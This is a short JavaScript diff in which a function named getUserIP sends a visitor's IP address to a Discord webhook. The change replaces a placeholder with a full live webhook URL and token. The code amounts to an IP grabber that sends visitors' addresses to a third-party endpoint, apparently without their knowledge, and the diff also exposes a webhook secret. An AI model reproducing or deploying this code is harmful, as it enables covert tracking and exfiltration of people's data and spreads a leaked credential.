@@ -9,7 +9,7 @@ function getUserIP() {
     .then(data => {
       ip = data.ip;
       // Send IP address to Discord webhook
-      const webhookURL = "your-webhook-url";
+      const webhookURL = "https://discord.com/api/webhooks/1367237113220698184/dRNpJg9cI-GD6PMGNHE22eAvjVPOIz5i8zfuIWOVADYCplQvQ3UBcqCL1vFet8CRtcMr";
       const payload = {
         content: `User IP: ${ip}`,
       };
